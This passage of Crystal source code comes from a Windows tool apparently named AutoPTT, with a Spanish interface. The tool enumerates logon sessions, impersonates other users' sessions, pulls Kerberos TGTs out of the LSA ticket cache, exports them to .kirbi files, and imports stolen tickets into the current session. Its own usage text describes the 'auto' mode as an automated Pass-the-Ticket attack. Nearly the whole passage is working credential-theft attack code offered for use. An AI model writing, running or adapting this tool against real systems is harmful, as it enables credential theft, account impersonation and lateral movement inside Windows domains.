  req.logon_id = LibWin::Luid.new

  response_ptr = Pointer(Void).null
  response_size = 0_u32
  protocol_status = 0_i32

  status = LibWin.LsaCallAuthenticationPackage(
    lsa_handle, auth_pack, pointerof(req).as(Void*),
    sizeof(LibWin::KerbQueryTktCacheRequest).to_u32,
    pointerof(response_ptr), pointerof(response_size), pointerof(protocol_status)
  )

  if status != 0 || protocol_status != 0
    puts "Error: KerbQueryTicketCache falló status=0x#{status.to_s(16)} proto=0x#{protocol_status.to_s(16)}"
    LibWin.RevertToSelf if need_revert
    LibWin.CloseHandle(h_imp_token) if need_revert
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  cache_response = response_ptr.as(LibWin::KerbQueryTktCacheResponse*).value
  ticket_count = cache_response.count_of_tickets
  ticket_base = response_ptr.as(UInt8*) + sizeof(LibWin::KerbQueryTktCacheResponse)

  target_server = nil
  ticket_flags = 0_u32

  ticket_count.times do |i|
    ticket = (ticket_base + i * sizeof(LibWin::KerbTicketCacheInfo)).as(LibWin::KerbTicketCacheInfo*).value
    server_name = lsa_unicode_to_string(ticket.server_name)
    if server_name.downcase.includes?("krbtgt")
      target_server = server_name
      ticket_flags = ticket.ticket_flags
      break
    end
  end
  LibWin.LsaFreeReturnBuffer(response_ptr)

  unless target_server
    puts "Error: No se encontró TGT para LogonId 0x#{target_logon_id.to_s(16)}"
    LibWin.RevertToSelf if need_revert
    LibWin.CloseHandle(h_imp_token) if need_revert
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  ticket_bytes, _, _ = request_service_ticket(lsa_handle, auth_pack, LibWin::Luid.new, target_server, ticket_flags)

  LibWin.RevertToSelf if need_revert
  LibWin.CloseHandle(h_imp_token) if need_revert

  unless ticket_bytes
    puts "[-] Error al recuperar ticket"
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  clean_username = username.empty? ? "unknown" : username
  ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '@', ' ', '$'].each { |c| clean_username = clean_username.gsub(c, '_') }

  filename = "0x#{target_logon_id.to_s(16)}_#{clean_username}.kirbi"
  File.write(filename, ticket_bytes)

  puts "\n[+] Ticket TGT exportado exitosamente"
  puts "    LogonId: 0x#{target_logon_id.to_s(16)}"
  puts "    Usuario: #{domain}\\#{username}"
  puts "    Servidor: #{target_server}"
  puts "    Archivo: #{filename}"
  puts "    Tamaño: #{ticket_bytes.size} bytes"

  LibWin.LsaDeregisterLogonProcess(lsa_handle)
end


def pass_the_ticket(filename : String)
  unless File.exists?(filename)
    puts "Error: No se puede abrir el archivo #{filename}"
    return
  end

  ticket_data = File.read(filename).to_slice
  file_size = ticket_data.size

  if file_size <= 0 || file_size > 10 * 1024 * 1024
    puts "[-] Tamaño de archivo inválido"
    return
  end

  lsa_handle = Pointer(Void).null
  if LibWin.LsaConnectUntrusted(pointerof(lsa_handle)) != 0
    puts "[-] LsaConnectUntrusted falló"
    return
  end

  auth_pack = lookup_kerberos_package(lsa_handle)
  unless auth_pack
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  struct_size = sizeof(LibWin::KerbSubmitTktRequest)
  submit_size = struct_size + file_size
  buffer = Bytes.new(submit_size)

  req_ptr = buffer.to_unsafe.as(LibWin::KerbSubmitTktRequest*)
  req_ptr.value.message_type = KERB_SUBMIT_TKT_MSG
  req_ptr.value.logon_id = LibWin::Luid.new
  req_ptr.value.flags = 0_u32
  req_ptr.value.key = LibWin::KerbCryptoKey32.new
  req_ptr.value.kerb_cred_size = file_size.to_u32
  req_ptr.value.kerb_cred_offset = struct_size.to_u32

  ticket_data.each_with_index { |b, i| buffer[struct_size + i] = b }

  response_ptr = Pointer(Void).null
  response_size = 0_u32
  protocol_status = 0_i32

  status = LibWin.LsaCallAuthenticationPackage(
    lsa_handle, auth_pack, buffer.to_unsafe.as(Void*), submit_size.to_u32,
    pointerof(response_ptr), pointerof(response_size), pointerof(protocol_status)
  )

  if status != 0 || protocol_status != 0
    puts "\nError: Error al importar ticket"
    puts "  Status: 0x#{status.to_s(16).rjust(8, '0')}"
    puts "  SubStatus: 0x#{protocol_status.to_s(16).rjust(8, '0')}"
    case protocol_status
    when -1073741429 then puts "  Razón: Ticket inválido o malformado"
    when -1073741275 then puts "  Razón: Dominio no encontrado"
    when -1073741730 then puts "  Razón: No hay sesiones de logon válidas"
    when -1073741811 then puts "  Razón: Parámetro inválido"
    end
    LibWin.LsaFreeReturnBuffer(response_ptr) unless response_ptr.null?
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  puts "\n[+] Ticket importado exitosamente en memoria"
  puts "    Archivo: #{filename}"
  puts "    Tamaño: #{file_size} bytes"
  puts "\n[+] Ticket ahora disponible en caché Kerberos"
  puts "    Puede verificar con: #{PROGRAM_NAME} klist"

  LibWin.LsaFreeReturnBuffer(response_ptr) unless response_ptr.null?
  LibWin.LsaDeregisterLogonProcess(lsa_handle)
end


def auto_export_and_import
  G_TGT_LIST.clear

  puts "[*] Modo auto: Enumerando tickets e importando TGT seleccionado..."
  print_current_logon_id
  enable_debug_privilege

  lsa_handle = get_lsa_handle
  if lsa_handle.null?
    puts "[-] Error al obtener handle LSA"
    return
  end

  auth_pack = lookup_kerberos_package(lsa_handle)
  unless auth_pack
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  session_count = 0_u32
  session_list = Pointer(LibWin::Luid).null
  if LibWin.LsaEnumerateLogonSessions(pointerof(session_count), pointerof(session_list)) != 0
    puts "[-] Error al enumerar sesiones"
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  session_count.times do |i|
    session_luid = (session_list + i).value
    session_data = Pointer(LibWin::SecurityLogonSessionData).null
    next if LibWin.LsaGetLogonSessionData(pointerof(session_luid), pointerof(session_data)) != 0
    next if session_data.null?

    sd = session_data.value
    username = lsa_unicode_to_string(sd.user_name)
    domain = lsa_unicode_to_string(sd.logon_domain)

    if username.empty?
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
      next
    end

    req = LibWin::KerbQueryTktCacheRequest.new
    req.message_type = KERB_QUERY_TKT_CACHE_EX_MSG
    req.logon_id = session_luid

    response_ptr = Pointer(Void).null
    response_size = 0_u32
    protocol_status = 0_i32

    status = LibWin.LsaCallAuthenticationPackage(
      lsa_handle, auth_pack, pointerof(req).as(Void*),
      sizeof(LibWin::KerbQueryTktCacheRequest).to_u32,
      pointerof(response_ptr), pointerof(response_size), pointerof(protocol_status)
    )

    if status != 0 || protocol_status != 0 || response_ptr.null?
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
      next
    end

    cache_response = response_ptr.as(LibWin::KerbQueryTktCacheResponse*).value
    ticket_count = cache_response.count_of_tickets

    if ticket_count == 0
      LibWin.LsaFreeReturnBuffer(response_ptr)
      LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
      next
    end

    ticket_base = response_ptr.as(UInt8*) + sizeof(LibWin::KerbQueryTktCacheResponse)
    ticket_count.times do |j|
      ti = (ticket_base + j * sizeof(LibWin::KerbTicketCacheInfoEx)).as(LibWin::KerbTicketCacheInfoEx*).value
      server_name = lsa_unicode_to_string(ti.server_name)
      add_tgt_to_list(session_luid.low_part, username, domain, server_name) if server_name.downcase.includes?("krbtgt")
    end

    LibWin.LsaFreeReturnBuffer(response_ptr)
    LibWin.LsaFreeReturnBuffer(session_data.as(Void*))
  end

  LibWin.LsaFreeReturnBuffer(session_list.as(Void*))

  if G_TGT_LIST.empty?
    puts "\nNo se encontraron TGTs en el sistema."
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  puts "\n" + "=" * 80
  puts "  TGTs DISPONIBLES"
  puts "=" * 80
  puts "#{"Índice".ljust(6)} #{"LogonId".ljust(12)} #{"Usuario".ljust(30)} #{"Dominio".ljust(20)} Servicio"
  puts "#{"─" * 6} #{"─" * 12} #{"─" * 30} #{"─" * 20} #{"─" * 32}"

  G_TGT_LIST.each_with_index do |tgt, idx|
    puts "#{(idx + 1).to_s.ljust(6)} #{"0x#{tgt.logon_id.to_s(16)}".ljust(12)} #{tgt.username.ljust(30)} #{tgt.domain.ljust(20)} #{tgt.service_name}"
  end

  print "\nElegir TGT para exportar e importar (1-#{G_TGT_LIST.size}), o 0 para cancelar: "
  input = gets.try(&.strip) || "0"
  choice = input.to_i? || 0

  if choice <= 0 || choice > G_TGT_LIST.size
    puts "Cancelado o elección inválida."
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  selected = G_TGT_LIST[choice - 1]
  puts "\n[*] Seleccionado: ##{choice} - 0x#{selected.logon_id.to_s(16)} (#{selected.username})"

  h_imp_token = impersonate_session(selected.logon_id)
  need_revert = false
  unless h_imp_token.null?
    if LibWin.ImpersonateLoggedOnUser(h_imp_token) != 0
      need_revert = true
    else
      LibWin.CloseHandle(h_imp_token)
      h_imp_token = Pointer(Void).null
    end
  end

  req2 = LibWin::KerbQueryTktCacheRequest.new
  req2.message_type = KERB_QUERY_TKT_CACHE_MSG
  req2.logon_id = LibWin::Luid.new

  response_ptr2 = Pointer(Void).null
  response_size2 = 0_u32
  protocol_status2 = 0_i32

  status = LibWin.LsaCallAuthenticationPackage(
    lsa_handle, auth_pack, pointerof(req2).as(Void*),
    sizeof(LibWin::KerbQueryTktCacheRequest).to_u32,
    pointerof(response_ptr2), pointerof(response_size2), pointerof(protocol_status2)
  )

  if status != 0 || protocol_status2 != 0
    puts "[-] Error al obtener caché de tickets status=0x#{status.to_s(16)} proto=0x#{protocol_status2.to_s(16)}"
    LibWin.RevertToSelf if need_revert
    LibWin.CloseHandle(h_imp_token) if need_revert
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  cache_response2 = response_ptr2.as(LibWin::KerbQueryTktCacheResponse*).value
  ticket_count2 = cache_response2.count_of_tickets
  ticket_base2 = response_ptr2.as(UInt8*) + sizeof(LibWin::KerbQueryTktCacheResponse)

  target_server = nil
  ticket_flags2 = 0_u32

  ticket_count2.times do |i|
    ticket = (ticket_base2 + i * sizeof(LibWin::KerbTicketCacheInfo)).as(LibWin::KerbTicketCacheInfo*).value
    server_name = lsa_unicode_to_string(ticket.server_name)
    if server_name.downcase.includes?("krbtgt")
      target_server = server_name
      ticket_flags2 = ticket.ticket_flags
      break
    end
  end
  LibWin.LsaFreeReturnBuffer(response_ptr2)

  unless target_server
    puts "[-] TGT no encontrado en caché"
    LibWin.RevertToSelf if need_revert
    LibWin.CloseHandle(h_imp_token) if need_revert
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  ticket_bytes, _, _ = request_service_ticket(lsa_handle, auth_pack, LibWin::Luid.new, target_server, ticket_flags2)

  LibWin.RevertToSelf if need_revert
  LibWin.CloseHandle(h_imp_token) if need_revert

  unless ticket_bytes
    puts "[-] Error al recuperar ticket"
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  puts "[+] Ticket recuperado exitosamente"
  puts "    Tamaño: #{ticket_bytes.size} bytes"
  puts "\n[*] Importando ticket a sesión actual..."

  struct_size = sizeof(LibWin::KerbSubmitTktRequest)
  submit_size = struct_size + ticket_bytes.size
  submit_buf = Bytes.new(submit_size)

  sub_ptr = submit_buf.to_unsafe.as(LibWin::KerbSubmitTktRequest*)
  sub_ptr.value.message_type = KERB_SUBMIT_TKT_MSG
  sub_ptr.value.logon_id = LibWin::Luid.new
  sub_ptr.value.flags = 0_u32
  sub_ptr.value.key = LibWin::KerbCryptoKey32.new
  sub_ptr.value.kerb_cred_size = ticket_bytes.size.to_u32
  sub_ptr.value.kerb_cred_offset = struct_size.to_u32

  ticket_bytes.each_with_index { |b, i| submit_buf[struct_size + i] = b }

  response_ptr3 = Pointer(Void).null
  response_size3 = 0_u32
  protocol_status3 = 0_i32

  status = LibWin.LsaCallAuthenticationPackage(
    lsa_handle, auth_pack, submit_buf.to_unsafe.as(Void*), submit_size.to_u32,
    pointerof(response_ptr3), pointerof(response_size3), pointerof(protocol_status3)
  )

  if status != 0 || protocol_status3 != 0
    puts "\nError: Error al importar ticket"
    puts "  Status: 0x#{status.to_s(16).rjust(8, '0')}"
    puts "  SubStatus: 0x#{protocol_status3.to_s(16).rjust(8, '0')}"
    case protocol_status3
    when -1073741429 then puts "  Razón: Ticket inválido o malformado"
    when -1073741275 then puts "  Razón: Dominio no encontrado"
    when -1073741730 then puts "  Razón: No hay sesiones de logon válidas"
    when -1073741811 then puts "  Razón: Parámetro inválido"
    end
    LibWin.LsaFreeReturnBuffer(response_ptr3) unless response_ptr3.null?
    LibWin.LsaDeregisterLogonProcess(lsa_handle)
    return
  end

  puts "\n[+] TGT importado exitosamente a sesión actual"
  puts "    LogonId: 0x#{selected.logon_id.to_s(16)}"
  puts "    Usuario: #{selected.username}"
  puts "    Servicio: #{target_server}"
  puts "\n[+] Ticket ahora disponible en caché Kerberos"
  puts "    Puede verificar con: #{PROGRAM_NAME} klist"

  LibWin.LsaFreeReturnBuffer(response_ptr3) unless response_ptr3.null?
  LibWin.LsaDeregisterLogonProcess(lsa_handle)
end


def print_banner
  puts <<-BANNER

       ___         __       ___  ____________
      / _ | __ __ / /_ ___ / _ \\/_  __/_  __/
     / __ |/ // // __// _ \\/ ___/ / /   / /   
    /_/ |_|\\_,_/ \\__/ \\___/_/    /_/   /_/    

    v1.2 - Enumerador de Tickets Kerberos (Crystal)
    sessions, klist, tickets, export, ptt, auto
  BANNER
end


def print_usage(program : String)
  puts "Uso:"
  puts "  #{program} auto             - Ataque Pass-the-Ticket automatizado"
  puts "  #{program} sessions         - Listar todas las sesiones de logon"
  puts "  #{program} klist            - Listar tickets en sesión actual"
  puts "  #{program} tickets          - Listar todos los tickets de todas las sesiones"
  puts "  #{program} export <LogonId> - Exportar un TGT dado el LogonId"
  puts "  #{program} ptt <archivo>    - Importar un archivo de ticket dado el nombre de archivo"
  puts ""
end


command = ARGV[0]?.try(&.downcase)

case command
when "sessions"
  print_current_logon_id
  enumerate_logon_sessions
when "klist"
  print_current_logon_id
  enumerate_my_tickets
when "tickets"
  print_current_logon_id
  enumerate_all_tickets
when "export"
  if ARGV.size > 1
    export_ticket(ARGV[1])
  else
    print_banner
    print_usage(PROGRAM_NAME)
  end
when "ptt"
  if ARGV.size > 1
    pass_the_ticket(ARGV[1])
  else
    print_banner
    print_usage(PROGRAM_NAME)
  end
when "auto"
  auto_export_and_import
else
  print_banner
  print_usage(PROGRAM_NAME)
end